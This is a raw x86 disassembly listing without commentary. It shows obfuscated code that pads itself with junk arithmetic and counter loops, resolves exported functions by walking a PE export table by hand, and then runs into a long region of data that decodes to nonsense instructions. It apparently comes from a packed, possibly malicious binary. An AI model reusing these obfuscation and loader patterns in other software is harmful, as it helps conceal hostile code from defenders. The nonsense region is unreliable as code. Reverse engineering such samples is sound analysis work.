  40c30a:	mov    esi,DWORD PTR ds:0x43364b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433687
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4336e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43362f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4336a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433633,0x433667
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4336ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4336ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4336ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4336ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4336ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4336ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4336ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4336ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43366b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4336ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4336ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43372b,0x43373b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4336af,0x4336bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4336c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433637,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43362b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43362f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433623,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4336e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4336f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4336a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4336eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4336eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4336eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4336eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4336eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4336eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4336eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4336eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4336eb
  40c4ce:	and    esi,DWORD PTR ds:0x4336ef
  40c4d4:	mov    DWORD PTR ds:0x4336eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4336bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433683,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43366f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4336fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4336eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4336f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x8fcb5658
  40c577:	aad    0x52
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c582:	push   edi
  40c583:	daa    
  40c584:	cmp    esi,DWORD PTR [edi+eax*1+0x16]
  40c588:	loop   0x40c5cf
  40c58a:	mov    BYTE PTR [edx+0x3b],al
  40c58d:	add    BYTE PTR ds:0x4002ce24,0xb8
  40c594:	pusha  
  40c595:	lods   al,BYTE PTR ds:[esi]
  40c596:	xor    bl,BYTE PTR [esi]
  40c598:	addr16 int 0x3d
  40c59b:	sbb    DWORD PTR [eax-0x827aa13],0xffffffa0
  40c5a2:	cmc    
  40c5a3:	mov    ebx,0x9b39517c
  40c5a8:	(bad)  
  40c5a9:	mov    bl,0x11
  40c5ab:	xor    bh,BYTE PTR [ecx+ecx*4-0x697cdcaf]
  40c5b2:	idiv   bl
  40c5b4:	sbb    cl,dl
  40c5b6:	out    dx,al
  40c5b7:	add    ebx,edx
  40c5b9:	ins    BYTE PTR es:[edi],dx
  40c5ba:	pop    ecx
  40c5bb:	test   BYTE PTR [ecx+0x70afe79e],al
  40c5c1:	mov    ah,0x5
  40c5c3:	jle    0x40c5cc
  40c5c5:	xchg   DWORD PTR [edi-0x9c78c6c],eax
  40c5cb:	(bad)  
  40c5cc:	in     al,0xc9
  40c5ce:	sbb    DWORD PTR [ecx-0x7],edx
  40c5d1:	or     eax,0x4ff74aca
  40c5d6:	scas   al,BYTE PTR es:[edi]
  40c5d7:	add    DWORD PTR [ecx+ebp*8-0x26],0xffffffc9
  40c5dc:	or     al,BYTE PTR [ecx-0xa8a451a]
  40c5e2:	add    edx,DWORD PTR [ecx]
  40c5e4:	xchg   ecx,eax
  40c5e5:	ror    DWORD PTR [ebp-0x7b56b36b],0x21
  40c5ec:	sar    DWORD PTR [edi+0x51cb166],1
  40c5f2:	test   eax,0x9a52bb7b
  40c5f7:	push   ds
  40c5f8:	jno    0x40c5a6
  40c5fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5fb:	sbb    BYTE PTR [esi+0x3e0adaaf],bh
  40c601:	jl     0x40c680
  40c603:	aaa    
  40c604:	mov    dl,0x6d
  40c606:	clc    
  40c607:	cmp    dl,BYTE PTR ds:0x819a4606
  40c60d:	cmp    cl,bh
  40c60f:	pushf  
  40c610:	or     ebp,esp
  40c612:	retf   
  40c613:	xlat   BYTE PTR gs:[ebx]
  40c615:	jle    0x40c616
  40c617:	sbb    ebp,edi
  40c619:	cmp    al,0x70
  40c61b:	jg     0x40c64e
  40c61d:	push   eax
  40c61e:	add    eax,0xd600140d
  40c623:	outs   dx,BYTE PTR ds:[esi]
  40c624:	loopne 0x40c652
  40c626:	and    eax,0x1b8691ce
  40c62b:	and    bh,0x3
  40c62e:	std    
  40c62f:	lods   eax,DWORD PTR ds:[esi]
  40c630:	and    ebp,0x74810cbc
  40c636:	std    
  40c637:	scas   eax,DWORD PTR es:[edi]
  40c638:	xchg   ebx,eax
  40c639:	jno    0x40c5ef
  40c63b:	sti    
  40c63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c63d:	mov    eax,ds:0x37a30545
  40c642:	dec    edi
  40c643:	jne    0x40c5cb
  40c645:	add    ebx,edi
  40c647:	pop    ebx
  40c648:	add    al,0xaf
  40c64a:	clc    
  40c64b:	pushf  
  40c64c:	div    DWORD PTR [ebp+0x12]
  40c64f:	not    DWORD PTR [ebx+0x78]
  40c652:	push   ecx
  40c653:	xchg   esp,eax
  40c654:	xlat   BYTE PTR ds:[ebx]
  40c655:	retf   0x4161
  40c658:	mov    ecx,0x258c17bf
  40c65d:	adc    ebx,edx
  40c65f:	push   ebx
  40c660:	cmp    DWORD PTR [ebx],esi
  40c662:	pusha  
  40c663:	adc    eax,0x56009a69
  40c668:	xchg   esi,eax
  40c669:	in     eax,dx
  40c66a:	add    ebx,ebp
  40c66c:	mov    ecx,0x60eb7cb8
  40c671:	rol    BYTE PTR [ecx-0x2d],0xa5
  40c675:	stc    
  40c676:	ins    DWORD PTR es:[edi],dx
  40c677:	ins    BYTE PTR es:[edi],dx
  40c678:	in     eax,dx
  40c679:	bound  esi,QWORD PTR [eax]
  40c67b:	std    
  40c67c:	ret    0xa0c1
  40c67f:	or     eax,0xc7854e2e
  40c684:	push   ebx
  40c685:	push   eax
  40c686:	(bad)  
  40c687:	jg     0x40c652
  40c689:	sub    eax,DWORD PTR [edi+0x1b]
  40c68c:	fcom   DWORD PTR [eax+0x19]
  40c68f:	ds jb  0x40c621
  40c692:	scas   al,BYTE PTR es:[edi]
  40c693:	add    bh,BYTE PTR [ecx+edi*2]
  40c696:	clc    
  40c697:	xchg   esi,eax
  40c698:	int    0xf8
  40c69a:	inc    ebp
  40c69b:	xchg   edi,ecx
  40c69d:	int    0xe
  40c69f:	xor    cl,BYTE PTR [edx]
  40c6a1:	adc    al,bh
  40c6a3:	add    ebx,DWORD PTR [ebx]
  40c6a5:	aaa    
  40c6a6:	or     eax,0x8de3e0cb
  40c6ab:	mov    ch,0xca
  40c6ad:	mov    bl,0xdd
  40c6af:	and    al,0xf4
  40c6b1:	(bad)  
  40c6b2:	push   esi
  40c6b3:	jle    0x40c6ea
  40c6b5:	inc    ebp
  40c6b6:	inc    ebp
  40c6b7:	outs   dx,DWORD PTR ds:[esi]
  40c6b8:	pop    edi
  40c6b9:	outs   dx,DWORD PTR ds:[esi]
  40c6ba:	push   0xb1cf8ade
  40c6bf:	cwde   
  40c6c0:	popa   
  40c6c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c2:	cmp    BYTE PTR [edx+0x3127a5d7],al
  40c6c8:	and    dh,bh
  40c6ca:	dec    DWORD PTR [ebx]
  40c6cc:	aam    0x70
  40c6ce:	sub    bp,di
  40c6d1:	cmp    edx,DWORD PTR [edi+0x20a0150]
  40c6d7:	xchg   BYTE PTR [edi],cl
  40c6d9:	sti    
  40c6da:	adc    DWORD PTR [ecx-0x1c],esp
  40c6dd:	fdivr  DWORD PTR [ebp-0x75]
  40c6e0:	lds    eax,FWORD PTR [edx-0x10]
  40c6e3:	xor    eax,0xce8c3ff3
  40c6e8:	popf   
  40c6e9:	sub    ebp,DWORD PTR [esp+edx*8]
  40c6ec:	popf   
  40c6ed:	cmp    al,0x13
  40c6ef:	mov    ah,ch
  40c6f1:	cmp    esi,edi
  40c6f3:	push   eax
  40c6f4:	jns    0x40c6e8
  40c6f6:	sbb    ch,BYTE PTR [edi]
  40c6f8:	lahf   
  40c6f9:	pop    ebp
  40c6fa:	mov    bh,cl
  40c6fc:	and    bh,BYTE PTR [edi]
  40c6fe:	adc    DWORD PTR [ebx+0xb],ecx
  40c701:	jecxz  0x40c6ce
  40c703:	popf   
  40c704:	mov    eax,0x23665d1e
  40c709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c70a:	in     eax,0xf0
  40c70c:	mov    dl,0xaa
  40c70e:	cdq    
  40c70f:	inc    ebx
  40c710:	gs add edx,esi
  40c713:	imul   esp,ebx,0x3f
  40c716:	fidiv  WORD PTR [edi-0x490f11da]
  40c71c:	daa    
  40c71d:	mov    ds:0x78f050e5,eax
  40c722:	aaa    
  40c723:	bound  ebp,QWORD PTR [ebp+0x4c089f5e]
  40c729:	xor    DWORD PTR [ecx-0x28],ebp
  40c72c:	pop    ecx
  40c72d:	sbb    BYTE PTR [esp-0x36],ah
  40c731:	sub    BYTE PTR [ebp+esi*1+0xa3a4248],bh
  40c738:	pushf  
  40c739:	sti    
  40c73a:	dec    eax
  40c73b:	les    edi,FWORD PTR [ebx]
  40c73d:	xor    DWORD PTR [edi+0x27528881],ecx
  40c743:	fisttp DWORD PTR [esi-0x37a9eab1]
  40c749:	aaa    
  40c74a:	js     0x40c6eb
  40c74c:	add    DWORD PTR [ebx],ebp
  40c74e:	pop    edx
  40c74f:	xchg   edi,eax
  40c750:	das    
  40c751:	test   al,0xe2
  40c753:	mov    edi,0x5ee17ed6
  40c758:	std    
  40c759:	cdq    
  40c75a:	push   0x649673d3
  40c75f:	dec    esi
  40c760:	lds    esp,FWORD PTR [edi-0x9f55536]
  40c766:	rcr    esi,cl
  40c768:	popa   
  40c769:	enter  0x9a62,0xd7
  40c76d:	jae    0x40c7dd
  40c76f:	and    eax,0xd72e9a95
  40c774:	dec    edi
  40c775:	not    DWORD PTR [edi]
  40c777:	mov    ebx,0xd4c1d136
  40c77c:	mov    BYTE PTR [esp+esi*4+0x44],ch
  40c780:	imul   edx,DWORD PTR [edx],0xc0149655
  40c786:	js     0x40c743
  40c788:	mov    dh,BYTE PTR [edi+ebx*1+0x64]
  40c78c:	out    dx,al
  40c78d:	or     eax,0x3a79bae7
  40c792:	jl     0x40c7a6
  40c794:	es and al,0xf5
  40c797:	xor    DWORD PTR [ebp*4-0x5b9b209b],esp
  40c79e:	xor    eax,0xda2cfba1
  40c7a3:	jnp    0x40c818
  40c7a5:	dec    eax
  40c7a6:	es ret 
  40c7a8:	add    DWORD PTR [ecx+0x29],ecx
  40c7ab:	dec    ebx
  40c7ac:	push   esi
  40c7ad:	add    al,0x6a
  40c7af:	call   0xb21f:0x70d5f2b4
  40c7b6:	int    0x2d
  40c7b8:	dec    ecx
  40c7b9:	outs   dx,BYTE PTR ds:[esi]
  40c7ba:	add    edx,DWORD PTR [edi]
  40c7bc:	xchg   edi,eax
  40c7bd:	loope  0x40c7f1
  40c7bf:	out    dx,al
  40c7c0:	popa   
  40c7c1:	mov    BYTE PTR [ebx-0x1f],dh
  40c7c4:	mov    BYTE PTR [ebx],bl
  40c7c6:	jnp    0x40c7e7
  40c7c8:	add    cl,BYTE PTR [edi+edx*8-0x53ca7904]
  40c7cf:	xchg   esp,eax
  40c7d0:	and    edx,DWORD PTR [ebx-0x31]
  40c7d3:	out    0xfa,eax
  40c7d5:	cmc    
  40c7d6:	rcl    ecx,1
  40c7d8:	xor    dl,BYTE PTR [ebp+0x16ebdca0]
  40c7de:	pop    edi
  40c7df:	sahf   
  40c7e0:	das    
  40c7e1:	and    eax,0x44770c70
  40c7e6:	iret   
  40c7e7:	mov    ds:0xcf9b871c,eax
  40c7ec:	adc    BYTE PTR [ebp-0x8],bh
  40c7ef:	xor    BYTE PTR [edx],dh
  40c7f1:	jno    0x40c80a
  40c7f3:	loop   0x40c7ad
  40c7f5:	test   DWORD PTR [ecx-0x2e],edx
  40c7f8:	jmp    0x6a580647
  40c7fd:	ins    BYTE PTR es:[edi],dx
  40c7fe:	jns    0x40c85f
  40c800:	and    edi,DWORD PTR [esi-0x9]
  40c803:	les    esp,FWORD PTR [esi+esi*2]
  40c806:	and    BYTE PTR [ebx],bh
  40c808:	and    dh,cl
  40c80a:	je     0x40c7d3
  40c80c:	ins    BYTE PTR es:[edi],dx
  40c80d:	cmp    al,0x30
  40c80f:	stos   BYTE PTR es:[edi],al
  40c810:	pop    ebx
  40c811:	or     eax,0x72e161dc
  40c816:	(bad)  
  40c817:	retf   
  40c818:	xor    bl,dl
  40c81a:	stc    
  40c81b:	or     ah,BYTE PTR [ebp-0x5e]
  40c81e:	mov    eax,0x305bb4b1
  40c823:	mov    dh,0xef
  40c825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c826:	cmc    
  40c827:	cmp    dh,bh
  40c829:	arpl   sp,bp
  40c82b:	mov    dl,0x21
  40c82d:	mov    ebp,0x2245207a
  40c832:	arpl   WORD PTR [esi-0x52ec520c],ax
  40c838:	add    BYTE PTR [eax],0xff
  40c83b:	mov    ebx,0x7ae66229
  40c840:	inc    ecx
  40c841:	out    0x7f,eax
  40c843:	stos   BYTE PTR es:[edi],al
  40c844:	jp     0x40c87b
  40c846:	mov    al,ds:0x67ea33aa
  40c84b:	add    DWORD PTR ds:0x4b747a13,edi
  40c851:	push   eax
  40c852:	adc    ebp,DWORD PTR [ecx+eiz*4-0x50ea93b6]
  40c859:	mov    ch,0x66
  40c85b:	sub    bl,BYTE PTR [ecx]
  40c85d:	clc    
  40c85e:	in     eax,0xbd
  40c860:	pop    ss
  40c861:	push   0x67
  40c863:	add    al,0xbd
  40c865:	adc    cl,cl
  40c867:	ret    
  40c868:	(bad)  
  40c869:	push   esi
  40c86a:	pop    eax
  40c86b:	jmp    0x40c89f
  40c86d:	test   eax,0x639fdf76
  40c872:	popa   
  40c873:	psubd  mm6,QWORD PTR [ecx-0x40]
  40c877:	retf   0x1d4f
  40c87a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c87b:	add    eax,0x80cbe666
  40c880:	mov    edi,0x8b270bda
  40c885:	inc    ebp
  40c886:	in     al,dx
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	add    DWORD PTR [ebp-0x2e],esi
  40c8b5:	mov    al,0x27
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	jecxz  0x40c8b9
  40c8c0:	xlat   BYTE PTR ds:[ebx]
  40c8c1:	xchg   esi,eax
  40c8c2:	jmp    DWORD PTR [eax+0x1ccbc99b]
  40c8c8:	leave  
  40c8c9:	jmp    0xfbbb85bc
  40c8ce:	mov    WORD PTR [eax],gs
  40c8d0:	aad    0xe0
  40c8d2:	or     DWORD PTR [ecx-0x6af10c91],ecx
  40c8d8:	(bad)  
  40c8d9:	mov    bh,0x89
  40c8db:	xor    BYTE PTR [ebp+0x53],bl
  40c8de:	pusha  
  40c8df:	inc    ecx
  40c8e0:	retf   0xb5ce
  40c8e3:	or     eax,0xd4c78d90
  40c8e8:	fstp   TBYTE PTR [ebx-0x19654bc7]
  40c8ee:	clc    
  40c8ef:	loop   0x40c92a
  40c8f1:	add    esi,DWORD PTR [ecx-0x31]
  40c8f4:	and    DWORD PTR [ebx+0x30],0x16
  40c8f8:	(bad)  
  40c8f9:	jns    0x40c914
  40c8fb:	hlt    
  40c8fc:	add    BYTE PTR [esi+eiz*1-0x7c],dh
  40c900:	inc    edx
  40c901:	nop
  40c902:	shr    BYTE PTR [eax-0x4e7bb9d3],0x95
  40c909:	lods   eax,DWORD PTR ds:[esi]
  40c90a:	sub    eax,0xa7993ab8
  40c90f:	lds    edx,FWORD PTR [ebp-0x573463a8]
  40c915:	fs push 0xec06d2c6
  40c91b:	xor    BYTE PTR es:[ebp-0x39],0xb5
  40c920:	iret   
  40c921:	iret   
  40c922:	or     DWORD PTR [ebp+0x5d],esi
  40c925:	popa   
  40c926:	out    dx,al
  40c927:	cmc    
  40c928:	push   ebp
  40c929:	cmp    ebp,DWORD PTR [edx+ecx*8+0x725e6486]
  40c930:	and    al,0x7a
  40c932:	out    dx,eax
  40c933:	cli    
  40c934:	cmp    ebp,DWORD PTR [ebp+0x6f]
  40c937:	jb     0x40c925
  40c939:	dec    esi
  40c93a:	xchg   esp,eax
  40c93b:	add    eax,0x3095763d
  40c940:	jecxz  0x40c90a
  40c942:	xchg   ebx,eax
  40c943:	jge    0x40c9ba
  40c945:	xor    dl,BYTE PTR [eax-0x46]
  40c948:	mov    ecx,0x79b720c6
  40c94d:	cvtps2pi mm7,QWORD PTR [bp+0x1bb1]
  40c953:	mov    bh,0xa9
  40c955:	or     esp,ebx
  40c957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c958:	rol    BYTE PTR [edx],0x7f
  40c95b:	xchg   edx,eax
  40c95c:	lods   eax,DWORD PTR es:[esi]
  40c95e:	dec    edx
  40c95f:	dec    edi
  40c960:	fisttp DWORD PTR [ebx+0x5b]
  40c963:	inc    ebp
  40c964:	sbb    BYTE PTR [ecx-0x56cff4a1],ch
  40c96a:	repnz push esi
  40c96c:	js     0x40c9af
  40c96e:	imul   edx,esp,0x40e74d97
  40c974:	or     bh,BYTE PTR [edx-0x3f52557f]
  40c97a:	xchg   BYTE PTR [eax+ebp*8+0xf],dh
  40c97e:	inc    ecx
  40c97f:	jmp    0x40c904
  40c981:	rcr    BYTE PTR [eax-0x71b1e8f9],1
  40c987:	jge    0x40c9d9
  40c989:	clc    
  40c98a:	ja     0x40c99b
  40c98c:	xchg   ecx,eax
  40c98d:	int    0xed
  40c98f:	mov    ebx,0x356f98b9
  40c994:	mov    ah,0xba
  40c996:	xchg   ebx,eax
  40c997:	jge    0x40c93c
  40c999:	and    eax,0x9fd51f1e
  40c99e:	addr16 mov ecx,ds
  40c9a1:	in     eax,0xed
  40c9a3:	push   edx
  40c9a4:	or     BYTE PTR [ebp+0xb883ff8],ch
  40c9aa:	(bad)  
  40c9ab:	out    0x66,eax
  40c9ad:	and    cl,BYTE PTR [esp+ecx*4+0x78]
  40c9b1:	and    eax,0x55f7d2e8
  40c9b6:	sbb    DWORD PTR [ecx],edx
  40c9b8:	fdivr  DWORD PTR [ebx+0x3c]
  40c9bb:	std    
  40c9bc:	ret    
  40c9bd:	outs   dx,DWORD PTR ds:[esi]
  40c9be:	mov    esi,DWORD PTR [esi+0x70a12482]
  40c9c4:	mov    BYTE PTR [ecx+0x117f0b36],bh
  40c9ca:	lods   eax,DWORD PTR ds:[esi]
  40c9cb:	adc    BYTE PTR [edi+0x770ff1a2],bh
  40c9d1:	out    0x13,eax
  40c9d3:	push   ecx
  40c9d4:	xchg   edi,eax
  40c9d5:	sahf   
  40c9d6:	out    dx,eax
  40c9d7:	push   ds
  40c9d8:	icebp  
  40c9d9:	inc    ecx
  40c9da:	xor    eax,0x5a0d5895
  40c9df:	iret   
  40c9e0:	push   ecx
  40c9e1:	pop    ebx
  40c9e2:	lea    ecx,[edi]
  40c9e4:	es pusha 
  40c9e6:	cwde   
  40c9e7:	mov    dl,0xa7
  40c9e9:	sbb    ch,bl
  40c9eb:	scas   al,BYTE PTR es:[edi]
  40c9ec:	mov    ah,0xc2
  40c9ee:	inc    esp
  40c9ef:	xor    BYTE PTR [ecx-0x61767f6],dh
  40c9f5:	fsubr  DWORD PTR [eax-0x78016ac1]
  40c9fb:	outs   dx,DWORD PTR ds:[esi]
  40c9fc:	arpl   sp,sp
  40c9fe:	xchg   ecx,eax
  40c9ff:	cmp    DWORD PTR ds:0xfac5bd07,edx
  40ca05:	cmp    eax,0x6cb0b87a
  40ca0a:	sbb    ecx,ebx
  40ca0c:	xor    DWORD PTR [edx],esi
  40ca0e:	mov    edx,0x47301e9
  40ca13:	jle    0x40ca1f
  40ca15:	mov    edx,0x1781e9d2
  40ca1a:	adc    ch,bl
  40ca1c:	cmp    ch,dh
  40ca1e:	cmp    ecx,DWORD PTR [edi]
  40ca20:	jge    0x40ca80
  40ca22:	icebp  
  40ca23:	push   ds
  40ca24:	fcomp  DWORD PTR [ebp-0x1e]
  40ca27:	fisub  WORD PTR [ecx-0x17ab91ca]
  40ca2d:	mov    dl,0x4f
  40ca2f:	shl    dl,cl
  40ca31:	inc    esp
  40ca32:	in     al,dx
  40ca33:	div    BYTE PTR [esi+0x47]
  40ca36:	xlat   BYTE PTR ds:[ebx]
  40ca37:	or     eax,0x2cc581bc
  40ca3c:	in     al,dx
  40ca3d:	(bad)  [esp+eiz*2+0x6c422e21]
  40ca44:	sub    al,0x63
  40ca46:	and    eax,0x7390d3c8
  40ca4b:	push   eax
  40ca4c:	add    edx,edi
  40ca4e:	mov    ecx,0x52dea945
  40ca53:	loop   0x40ca70
  40ca55:	test   BYTE PTR [edi+0x1b],0x56
  40ca59:	retf   0x9cd1
  40ca5c:	js     0x40ca56
  40ca5e:	or     ebp,DWORD PTR [edx+0x46]
  40ca61:	mov    bh,0x27
  40ca63:	(bad)  
  40ca65:	sbb    ebx,DWORD PTR [edx]
  40ca67:	xor    DWORD PTR [ebx],edi
  40ca69:	rcr    BYTE PTR [eax],0x99
  40ca6c:	inc    esi
  40ca6d:	shl    BYTE PTR [ebp-0x4400b40a],0x67
  40ca74:	out    dx,eax
  40ca75:	mov    dl,BYTE PTR [edx-0x28108a97]
  40ca7b:	pop    esp
  40ca7c:	nop
  40ca7d:	rcl    BYTE PTR [eax],1
  40ca7f:	aas    
  40ca80:	sbb    al,0x6b
  40ca82:	jp     0x40ca1f
  40ca84:	inc    ebp
  40ca85:	inc    ebx
  40ca86:	ja     0x40ca49
  40ca88:	or     BYTE PTR [edx+0x2cf0fb3f],0xb7
  40ca8f:	clc    
  40ca90:	sub    ebp,DWORD PTR [esi+eax*1]
  40ca93:	mov    DWORD PTR [esp+ecx*1-0xd],ebx
  40ca97:	inc    esi
  40ca98:	sub    DWORD PTR ds:0x94b6971e,edx
  40ca9e:	popa   
  40ca9f:	enter  0xb28a,0x68
  40caa3:	les    ebx,FWORD PTR [edi-0x72]
  40caa6:	jne    0x40cac0
  40caa8:	aaa    
  40caa9:	jg     0x40ca67
  40caab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caac:	fldenv [edx+0x49]
  40caaf:	repz sub edx,DWORD PTR [edi-0x80]
  40cab3:	mov    ah,0x67
  40cab5:	jge    0x40cb0c
  40cab7:	das    
  40cab8:	mov    edi,0xa73eb7d9
  40cabd:	jg     0x40caeb
  40cabf:	shr    ecx,1
  40cac1:	cmc    
  40cac2:	xchg   edi,eax
  40cac3:	shl    DWORD PTR ds:0x15696d29,cl
  40cac9:	mov    dl,0x0
  40cacb:	pushf  
  40cacc:	xor    DWORD PTR [edx+0x1257d770],ebx
  40cad2:	dec    eax
  40cad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad4:	shl    DWORD PTR [esi+ebp*8+0x40],1
  40cad8:	int3   
  40cad9:	cmp    ah,BYTE PTR [edx-0x485cd867]
  40cadf:	sub    bl,bh
  40cae1:	and    al,ah
  40cae3:	out    dx,al
  40cae4:	bound  edi,QWORD PTR [ecx]
  40cae6:	add    DWORD PTR [ecx+0xe6f5cac],esi
  40caec:	add    DWORD PTR [ebx-0xc595c24],0xffffff94
  40caf3:	jl     0x40cb07
  40caf5:	stos   DWORD PTR es:[edi],eax
  40caf6:	popa   
  40caf7:	es std 
  40caf9:	lock mov bl,0x46
  40cafc:	or     eax,0x1c58c9d1
  40cb01:	(bad)  
  40cb02:	iret   
  40cb03:	std    
  40cb04:	sub    BYTE PTR [ebx+0x20720162],bh
  40cb0a:	out    dx,al
  40cb0b:	cli    
  40cb0c:	mov    ah,0xf7
  40cb0e:	cmp    ebx,DWORD PTR [ebp+0x6d]
  40cb11:	bound  edi,QWORD PTR [esi-0x74]
  40cb14:	sbb    eax,0xf722f8bb
  40cb19:	dec    esi
  40cb1a:	(bad)  
  40cb1b:	xor    eax,0xedacfb26
  40cb20:	push   esi
  40cb21:	gs stos BYTE PTR es:[edi],al
  40cb23:	mov    edx,es
  40cb25:	sbb    al,0x42
  40cb27:	jge    0x40cb14
  40cb29:	pop    eax
